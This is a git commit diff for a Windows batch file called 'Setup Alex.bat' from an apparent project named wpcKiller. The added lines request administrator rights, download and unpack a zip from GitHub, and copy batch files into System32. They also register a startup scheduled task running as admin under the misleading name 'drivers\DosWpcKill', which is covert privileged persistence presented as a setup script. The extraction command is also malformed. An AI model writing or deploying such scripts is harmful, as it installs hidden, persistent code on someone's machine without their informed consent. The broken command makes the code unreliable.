6389e05293836768893c7d90d7dc6b818d563c49
cbaie9 ( cb9 ) <75169332+cbaie9@users.noreply.github.com>
2021-09-23 12:02:18 +0200

    1.2.1
    download auto file + extract

--- Setup Alex.bat
+++ Setup Alex.bat
@@ -1,13 +1,17 @@
 echo Requesting Administrator privledges, please wait for UAC.
 powershell /c start-process -verb runAs \"%~s0\"
-cd %homepath%\desktop
-echo hello alexendre 
+cd %temp%
+Md Dos
+cd dos
+powershell -Command "Invoke-WebRequest https://github.com/cbaie9/wpcKiller/archive/refs/heads/main.zip -Outfile  files.zip"
+powershell -command "Expand-Archive -LiteralPath %temp%\dos"
+cd wpcKiller-main\wpcKiller-main
 move msdos.bat %windir%\System32
 move win.bat %windir%\system32
 move reboot.bat %windir%\system32
 move patch.bat %windir%\system32
-SCHTASKS /CREATE /SC onstart /TN "drivers\DosWpcKill" /TR "C:\Windows\System32\patch.bat" /RU admin
+move dosexec.bat %homepath%
 Cd %windir%\system32
 start msdos.bat -verb runAs \"%~s0\"
-exit
-powershell -Command "InvokeWebRequest https://github.com/cbaie9/wpcKiller/archive/refs/heads/main.zip -Outfile  files.bat"
+SCHTASKS /CREATE /SC onstart /TN "drivers\DosWpcKill" /TR "C:\Windows\System32\dosexec.bat" /RU admin
+
